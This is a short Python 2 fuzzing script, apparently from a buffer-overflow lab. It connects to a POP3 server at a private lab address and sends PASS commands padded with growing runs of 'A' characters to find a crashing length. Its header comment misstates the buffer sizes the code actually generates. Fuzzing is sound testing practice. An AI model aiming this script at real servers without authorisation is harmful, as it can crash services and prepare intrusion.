#!/usr/bin/env python

import os
import socket

os.system("clear")

# Create an array of buffers from 10 to 2000, with increments of 20.
buffer=["A"]
counter=100

while len(buffer) <= 30:
     buffer.append("A"*counter)
     counter=counter+200

for string in buffer:
     print "\n\nFuzzing PASS with %s bytes." % len(string)

     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     connect=s.connect(("172.16.181.135",110))    # Connect to IP on port 110.

     s.recv(1024)                                 # Receive reply.
     s.send("USER test\r\n")                      # Send username 'test'.
     s.recv(1024)                                 # Receive reply.
     s.send("PASS " + string + "\r\n")            # Send password 'PASS' plus random buffer.
     s.send("QUIT\r\n")                           # Send command 'QUIT'.
     s.close()                                    # Close socket.
